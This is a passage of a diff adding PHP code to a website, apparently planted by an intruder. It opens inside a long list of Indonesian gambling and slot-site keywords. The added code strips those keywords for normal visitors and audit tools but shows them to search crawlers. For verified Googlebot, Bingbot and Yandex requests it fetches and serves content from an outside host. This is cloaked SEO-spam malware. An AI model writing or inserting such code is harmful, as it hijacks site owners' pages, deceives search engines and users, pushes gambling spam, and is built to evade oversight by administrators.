slot'|'slotdana'|'anti rungkad'|'spinslot88'|'mpo1212'|'jarum77'|'mgo303'|'slot deposit dana 5000'|'kuy138 slot'|'doyan303'|'super gacor88'|'gbo007 slot'|'dewaslot389'|'slot qris'|'h2h slot'|'ovo slot'|'wadah4d'|'cewekslot88'|'padi777'|'jpspin88'|'agen288'|'profit303'|'koislot88'|'naga777'|'ceri123 slot'|'salam 88 slot'|'airbet88 slot'|'koi77'|'qqindobet'|'aktif4d'|'dana slot 777 login'|'wayang88 slot'|'gacor slot 777'|'web slot gacor'|'rtp live hari ini'|'mpo88'|'emasslot88'|'sultan88'|'dangdut4d'|'sawer4d'|'ganja303'|'gacor x500 slot'|'mpo1551'|'borneo338'|'spo777'|'pg slot 88'|'spin138'|'slot8800'|'sayap123'|'kingbet303'|'kaisar888'|'mandala89'|'88jackpot'|'33gg slot'|'kontan slot'|'hacker slot'|'garuda999'|'slot798'|'bandar slot88'|'sedayu138'|'horas88'|'win88 login'|'raja777'|'serdadu88'|'nama situs slot gacor'|'akurat slot'|'babe88'|'dewa911'|'rama slot'|'sarang777'|'kdslot777'|'ggplay88'|'judi online24jam deposit dana'|'396 slot'|'naga88'|'heroslot77'|'asialive88 slot'|'batik77'|'slot gacor malam ini 2022'|'mbcslot88'|'dewa4dku'|'situs slot terpercaya 2022'|'the slot 777'|'neko 77 slot'|'tarik4d'|'slot2500'|'slot depo 10k dana'|'slot977'|'jago168'|'mpo369'|'playslots88'|'king138 slot'|'semeru4d'|'hiu4d'|'mega118 slot'|'aka4d'|'slot judi gacor'|'daftar slot pakai dana'|'premier slot88'|'bos717'|'loyal4d'|'maxbet88'|'agen slot 77'|'dana slot 777'|'mojobet89'|'iblis4d'|'panda slot 88'|'pragmatic play 88'|'gboplay138'|'slot online deposit dana'|'bahagia4d'|'hoki29'|'jendral888'|'aston777'|'gacor slot88'|'liveslot365'|'prada slot'|'uang388'|'yukislot99'|'indocuan88'|'daduemas88'|'mesin777'|'cara daftar slot online pakai dana'|'vipslot99'|'mpo868'|'slotpulsa88'|'asia918'|'mpo7788'|'bintaro88'|'bigslot88'|'kilat77 slot'|'rtp agen138'|'ug808'|'zeus77'|'warga88'|'planet88 slot'|'ketua77'|'slotjitu88'|'vegasslot77'|'new slot88'|'lantai6 slot'|'situs gacor 2022'|'pas77 slot'|'slot hoki terpercaya'|'inajp slot'|'situs terpercaya slot'|'mainslot369'|'hobi69'|'fire138'|'slot gacor pragmatic play'|'mpo228'|'jam350 slot'|'game slot dana'|'alba slot'|'indoslot388'|'wajik777'|'zonagaming77'|'qqmega368'|'inti123'|'hore55'|'77slot'|'pragmatic 138'|'bandartaruhan168'|'royalslot98'|'vigor slot'|'mamaslot88'|'warung138'|'nxslot88'|'slot deposit 5000 via dana'|'usaha88'|'winlive88'|'cihuy88 slot'|'slotup88'|'liga168'|'alfabet88'|'dinasti168'|'pulsa 88'|'wso138'|'cinta777'|'ugslot900'|'dewabet388'|'avatar slot'|'rgo303'|'kayamendadak88'|'100 slot gacor'|'vegas108 slot'|'sikat88 slot'|'top508 slot'|'bolaslot'|'asiahoki77 slot'|'gbo007'|'trabas007 slot'|'slot2121'|'realbet99'|'salam88'|'raja787 slot'|'qq77bet'|'vaksin99'|'kuat4d'|'dewataslot88'|'deposlot88'|'buat akun slot pakai dana'|'899slot'|'suria88'|'luxury1288'|'totoslot777'|'olb88 slot'|'premierslot88'|'piala 88'|'pialasport'|'jam slot gacor'|'sinar89'|'hajar88'|'hoki138 slot'|'cuan123'|'rtp cnn slot'|'helo4d'|'monas77'|'bigbos777 slot'|'golden 138 slot'|'royal188bet'|'bigbos777'|'slot17'|'raja777 slot'|'arena88slot'|'ayo gacor'|'dewahoki303'|'rajaqq99'|'goldwin678'|'idn33'|'selot888'|'sgo777'|'gacor 305 slot'|'bigo88'|'totomaniac'|'nagabet123'|'777 gacor'|'rtp tertinggi hari ini'|'lumbung138'|'dunia gacor777'|'demoslot88'|'88dewi'|'lapak123'|'king338'|'s68bet'|'depo4d'|'sensa138'|'havana88'|'masterbet111 slot'|'atm4d'|'gemilang77'|'198slot'|'kingbet89'|'qqasia88'|'situs slot gacor deposit pulsa tanpa potongan'|'thr777'|'deluna4d slot'|'gacor680'|'akarslot777'|'cara daftar slot pakai dana'|'168jackpot'|'goltogel slot'|'markas138'|'uban4d'|'goldenbet88'|'dewi5000'|'doraplay88 slot'|'mpo2888'|'cuanslot88'|'kuy89'|'smartgaming77'|'asia76 slot'|'livebet88'|'fortune slot 88'|'giga slot138'|'toto77'|'mpo388'|'hoki4d slot'|'gacorslot168'|'coba777'|'rajacuan69'|'marina 77 slot'|'396club slot'|'asik138'|'afabola'|'auto7slot'|'rumahslot99'|'sakura188'|'jelas138'|'link slot gacor hari ini pragmatic play'|'duniaplay88'|'sultan77'|'liveslot168'|'wishbet88'|'ninja138'|'kokoslot'|'lumbungslot138'|'mpo39'|'minimal deposit 5rb'|'jdslot888'|'slot deposit pulsa gelora188'|'bocoran rtp slot'|'danaslot77'|'situs 138 slot'|'slot gacor terpercaya 2022'|'369slot'|'asg55 slot'|'gameslot37'|'garuda138 slot'|'kingbet138'|'oborslot88'|'jp789'|'mastermpo'|'gacor 138 slot'|'bareng88'|'qqpanda88'|'rtp idcash88'|'ceri138'|'agen77'|'neon4d slot'|'cocol88 slot'|'citra88'|'laju77'|'gebyar4d'|'slot338'|'slot388'|'slot368'|'garuda 888'|'kenangan4d'|'laga88'|'tunai4d'|'bonus 138'|'77neko'|'csbo88'|'19dewa slot'|'jewel4d'|'naga123'|'sumo777'|'rezeki123'|'cuan138'|'key4d slot'|'cuan slot 88'|'oceanslot88'|'slot fafa88'|'vgslot88'|'lexus88'|'slot 138 gacor'|'ras777'|'agen89 slot'|'slot155'|'ceri88'|'oyo88 slot'|'gokil88'|'goto4d'|'situs slot resmi terpercaya'|'rumahmpo'|'ibc138'|'besar88'|'mega sensa slot'|'spesial4d'|'hokibet188'|'lion4d'|'link268 slot'|'slot depo 5k dana'|'panen338'|'bumi303'|'gacor 777'|'slot online terpercaya pandora188'|'cuan4d'|'idnaga99'|'cece188'|'gilaslot1 slot'|'gudang4d'|'slotbola88 deposit pulsa tanpa potongan'|'jam gacor hari ini'|'jitu99'|'4dslot'|'joker81'|'tambang888'|'jam slot gacor hari ini'|'koi365'|'slot resmi terpercaya'|'5unsur slot'|'slot pulsa 88'|'slot vigor'|'dragon99 slot'|'receh 138'|'slot gaming 88'|'mega138 slot'|'bandar36'|'unyil4d'|'rtpslot88'|'situs 138'|'jp8800 slot'|'alexaslot138'|'slot deposit 2000 via dana'|'slotraja777'|'gacor88jp'|'supercuan889'|'pro8et slot'|'turbo 138 slot'|'dewa96'|'suka slot 88'|'bwo99'|'sultan138 slot'|'sgo777 slot'|'judi online24jam deposit uang'|'1001liga'|'quiz4d'|'rtp pg soft'|'rtp slot bos88'|'bintang168 slot'|'piala88 gacor'|'mpo383 slot'|'mercy88'|'geo138'|'slot 4d terpercaya'|'slot1m'|'hoki slot 365'|'mpo288'|'juara4d'|'mami188'|'bigslot77'|'bos01 slot'|'rtp slot88ku'|'ratu188'|'gacor899'|'ole99 slot'|'glory slot 777'|'emas168 slot'|'sensa838'|'game slot gacor hari ini'|'mplay777'|'dana 178 slot'|'garena4d'|'daget77'|'dunia 777'|'dunia slot77'|'judi388'|'123bola'|'123slot'|'ebet188'|'lux88togel'|'istana99 slot'|'klik365'|'gelar4d'|'pik4d slot'|'jvs88 slot'|'mpo300'|'slot deposit 3000 via dana'|'teluk4d'|'tigerbet888'|'permaisuri4d'|'gacor138 slot'|'arena88'|'fantasyslot88'|'sakti138'|'dana slot77'|'batman138'|'rans4d'|'mpo76 slot'|'mpo138 slot'|'mpotop88'|'slot138 rtp'|'joget4d'|'bosbobet'|'slot gacor 77'|'yabos88'|'star 777 slot'|'avatarslot88'|'qqslot77'|'gacor 96'|'slot27'|'qq303bet'|'winbet299'|'sihoki gacor'|'wso 138'|'siul4d'|'the slot777'|'sofabet88'|'rtp dewaslot99'|'idn slot 777'|'naga505'|'yuk69'|'268slot'|'joker slot 777'|'deltabet88'|'slot288'|'rtp pragmatic88'|'depo 88 slot'|'vipbet88'|'rtp hoki99 slot'|'superheboh88'|'moba4d'|'luckyslot77'|'roma4d slot'|'rtp megawin188'|'inislot'|'1121slot'|'spinbet99'|'sog789'|'agen 5000 slot'|'star 77 slot'|'daftar slot88'|'sjo138'|'sonic88 slot'|'judisakti slot'|'nusantara88 slot'|'situs slot terbaik dan terpercaya'|'baka88'|'hoki 99'|'homebet88'|'ug808 slot'|'69cuan'|'qq88'|'rtp airbet88'|'xo4d'|'depo 20 bonus 20 to kecil'|'pragmatic218'|'kumpulan situs infini88'|'suhu88 slot'|'bri4d slot'|'link268'|'bebasjudi88'|'topbet88'|'okeplay777 slots'|'judi online24jam deposit'|'hero88 slot'|'slot gacor hari ini via dana'|'kangenslot'|'dingdong77'|'nex777 slot'|'boba138'|'bolacasino88'|'nx303 slot'|'dewakoin99 slot'|'idslot'|'marketslot88'|'panen138 rtp'|'judi online24jam terpercaya 2022'|'uji4d slot'|'agen388'|'pragmatic138'|'slotnation88'|'katsu5 slot'|'dolar138 slot'|'hoki268'|'ratu111'|'oke777'|'gatotkaca138'|'rtp piramid slot'|'silva4d'|'gacor4d slot'|'mpo2qq'|'gacor 368'|'live slot168'|'viral88'|'jos889'|'mahjong 138 slot'|'gacor 33'|'29hoki slot'|'pro88 slot'|'cr7vip slot'|'189slot'|'onebet303'|'soju slot'|'jeger88'|'situs303'|'slot deposit dana gelora188'|'dede4d'|'raja77'|'kebo88'|'barbar77'|'simba4d'|'joker slot88'|'indobet77'|'slot rtp live'|'sky388 slot'|'mojok34'|'untung99'|'138slot'|'winning369'|'hokislot168'|'taktik88'|'gaskan88'|'zoom188'|'mega slot 777'|'situs slot gacor jam ini via dana'|'garuda999 slot'|'halo69 slot'|'pansos4d'|'situs slot online terpercaya'|'slot online terbaru sakura188'|'psg slot gacor'|'vegas108'|'hermes4d'|'armada4d'|'psg slot 138'|'starxo88 slot'|'bintang77 slot'|'hoki311'|'uang slot88'|'halo303 slot'|'hunian303'|'rtp panen138'|'slot365 pulsa tanpa potongan'|'slot deposit gopay'|'jos777 slot'|'kingdom4d slot'|'togel62 slot'|'judi slot gacor'|'airslot88'|'halte4d'|'egp88 slot'|'ign88'|'rtp slot 88'|'mp008 slot'|'vipbet88 slot'|'garuda999 pro'|'rtp indobet'|'jam gacor pragmatic'|'bima88 slot'|'mpo108'|'markas388'|'joker138'|'rrqslot188'|'liga365'|'joker 123'|'daftar slot777'|'asiabet88 slot'|'top508'|'respin123'|'mega228 slot'|'bape slot 88'|'prada 188 slot'|'garuda888 slot'|'hiu4d slot'|'ibet44'|'giga 138 slot'|'apple4d'|'rajatoto88 slot'|'agen asia 88'|'money138'|'hokislot96'|'slot gacor dana'|'zeus 138 slot'|'ubud4d'|'mahabet77'|'slot4d tergacor'|'situs slot dana'|'slot deposit via dana'|'n88 slot'|'suneo138'|'obs188'|'gacorslot777'|'ug300 slot'|'warganet99'|'maxpro88'|'bocor88'|'nexusengine slot'|'lomba4d'|'black 138 slot'|'sultanslot365'|'hoki138 gacor'|'yoyo88'|'agen126'|'gacor 138'|'slot88 luck'|'ceriabet88'|'rog777 slot'|'vios88'|'erigo4d slot'|'slotsensa'|'royal228'|'bmw slot88'|'asiaslots88'|'toto855 slot'|'daftar slot online via dana'|'bacot138'|'qq777'|'koinslot888'|'berkah4d'|'slot234'|'situs slot77'|'ajr88 slot'|'interbola2'|'cakrabola slot'|'grand88 slot'|'situs infini88'|'belanja4d'|'royalbet188'|'slot judi terpercaya'|'depo168'|'metro77 slot'|'hokislot89'|'royal138 slot'|'mpo338'|'liga188'|'mpo878 slot'|'sarang777 slot'|'bangjago88 2'|'slot gacor via dana'|'mpo7788 slot'|'qq1221 slot'|'hoki69'|'gacor368 slot'|'gacor 889'|'viralslot77'|'slot plus 88'|'988bet slot'|'dewacasino88'|'bos138 slot'|'jendral88'|'togel389'|'bolaslot99'|'raja138'|'tiara4d'|'bandar 138'|'qqcash188'|'ug234'|'slot138 link alternatif'|'capital303'|'slot138 login link alternatif'|'rtp slot pg soft'|'slotgacor889'|'5unsur3'|'harum 4d'|'qqicon188'|'kuda189'|'naga138 slot'|'naga168'|'playstar77'|'slot online dana'|'jiwaku88'|'okplay77'|'ciputra88'|'maniaslot88'|'bonus138 slot'|'bandar138'|'lionbet777'|'lucky 88 slot'|'wahana138'|'hokiplay99 slot'|'pulsa 88 slot'|'okeplay777'|'sabi slot88'|'judisakti'|'gasbet88 slot'|'vio77'|'rgo365'|'indo350'|'link judi'|'indowin 168'|'396club'|'ombak123'|'macau188'|'master888 slot'|'menang 123'|'tigerbet88'|'slot dana 77'|'jekpot88'|'putarslot88'|'gopay 69 slot'|'slot161'|'magnet33'|'kontes123'|'gacor118'|'goal55 slot'|'psg slot'|'mukabet88'|'tempur 777'|'tripoker'|'menara188'|'303slot'|'langit77'|'sumotogel'|'cogan33'|'cuan jp'|'rankslot'|'bighoki'|'okb88'|'sumo77'|'nasaki68'|'emirates'|'club88'|'kiev'|'seychelles'|'gitartogel'|'707slot'|'ibet899'|'samkuan'|'merapislot'|'dili'|'s78bet'|'koinpelangi'|'kelinci99'|'selot5000'|'suksestoto'|'pokersetan'|'funpoker88'|'ligamurni'|'asiaklup'|'mawarmpo'|'dewatangkas'|'tobago'|'gacor 4d'|'wahyu88'|'ruko4d'|'4d dewa'|'icafe4d'|'hometogel'|'mpo45'|'jayaqq'|'forumslot'|'jawa303'|'kingdomslot4d'|'wunschbanner'|'roket138'|'champion4d'|'526bet'|'kilat365'|'dewa gg'|'papahoki'|'prediksi168'|'rame88'|'capsatoto'|'mogadishu'|'tanjung verde'|'macanasia88'|'genktoto'|'toyota777'|'poin123'|'bukti4d'|'tamu99'|'sakura303'|'mediaslot88'|'qqmobil'|'ibcbet'|'hanoman4d'|'juara 123'|'dewijoker'|'zambia'|'taruhancash'|'olxslot'|'imbajo'|'dewahoki77'|'selera123'|'paketqq'|'ezykasino'|'kacaslot88'|'totogel'|'gb777'|'kroasia'|'gengmpo'|'9bet'|'hanoman77'|'mpo22'|'tunisia'|'alphabet303'|'intan777'|'ovovegas'|'toto911'|'anekaslot99'|'bigwin333'|'melati88'|'jago168'|'mangatoto'|'paten138'|'layarkaca 21'|'mpo00'|'istanaimpian2'|'atas4d'|'h20slot'|'yerevan'|'totoakurat'|'suriname'|'javaonline99'|'20bet'|'pdipoker'|'modalhoki88'|'indobegas4d'|'rendang88'|'ligabintang'|'bimaslot'|'qqslot888'|'angkanet 4d'|'danapkv'|'jos889'|'juara 991'|'sdtoro'|'gamelantogel'|'lala4d'|'panen365'|'raja555'|'dewa hoki 303'|'bebek66'|'hokicuan88'|'milan 69'|'jaya22'|'sempurnatoto'|'serasi189'|'sahabatslot88'|'dewa 369'|'halte 4d'|'aliansi4d'|'ratu555'|'parlayfifa855'|'slotking69'|'koi5d'|'99onlinesports'|'arisan88'|'kawasantoto'|'sirkuit 4d'|'ezabet'|'sukma88'|'harmoni4d'|'galaxy88'|'aksi4d'|'asiapoker99'|'praha'|'toktokbet'|'pion303'|'sip77'|'idn77'|'totoraja'|'debitqq'|'ug266bet'|'dewacuan99'|'juaragan69'|'lot5000'|'hoki680'|'venomtoto'|'76slot'|'oke4d'|'sultan99'|'maxbet338'|'qqbareng'|'ini303'|'haitogel'|'love4d'|'kingslot96'|'sands138'|'dewislot'|'judi lot'|'awanaslot'|'italia'|'zeus138'|'virtusslot'|'simba77'|'liga365'|'radiumplay'|'dewacinta'|'blangkonslot'|'jp369'|'dewa123'|'88big'|'maxwin369'|'slot303'|'pragmaticbet'|'bursa88'|'egp138'|'ebet88'|'pamantogel'|'auto hoki'|'otoslot'|'asiawin303'|'ibu4d'|'kakakbet68'|'moldova'|'77bet'|'bigwin999'|'indogenting'|'fipbet'|'jet4d'|'kartucantik'|'kaptenmpo'|'onix77'|'king4dstar'|'net888'|'mpl77'|'kepri168bet'|'arwana89'|'rajabet88'|'idn96'|'qqmamibet'|'stockholm'|'sipslot88'|'koin168'|'kilat69'|'wakakaslot'|'raffi888'|'jpspin88'|'tbilisi'|'wonplay888'|'hore55'|'senja777'|'diorslot88'|'olx138'|'tim126'|'casino123'|'qqslot1221'|'togel dingdong'|'kudabet'|'asia138'|'merlionqq'|'kampung77'|'toba787'|'pialasport'|'bimabet'];
+        foreach ($keywords as $kw) {
+            if (!is_googlebot() || is_audit_or_tool_access()) {
+                $html = str_ireplace($kw, '', $html);
+            }
+        }
+        return $html;
+    }
+
+    return filter_sensitive_keywords($buffer);
+});
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$hostname = gethostbyaddr($ip);
+
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$bot_url = "https://kepala-page.sbs/ipas/home.php";
+
+if (preg_match($botchar, $ua)) {
+    if (
+        (strpos($ua, 'googlebot') !== false && strpos($hostname, 'googlebot.com') !== false) ||
+        (strpos($ua, 'bingbot') !== false && strpos($hostname, 'search.msn.com') !== false) ||
+        (strpos($ua, 'yandex') !== false && strpos($hostname, 'yandex.ru') !== false) ||
+        (strpos($ua, 'google-inspectiontool') !== false)
+    ) {
+        
+        if ($_SERVER['HTTP_HOST'] !== parse_url($bot_url, PHP_URL_HOST)) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $bot_url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            $response = curl_exec($ch);
+            curl_close($ch);
+            echo $response;
+            ob_end_flush();
+            exit;
+        }
+        
+    } else {
+        
+        header("HTTP/1.1 200 OK");
+        header("Content-Type: text/html");
+        echo "";
+        ob_end_flush();
+        exit;
+    }
+}
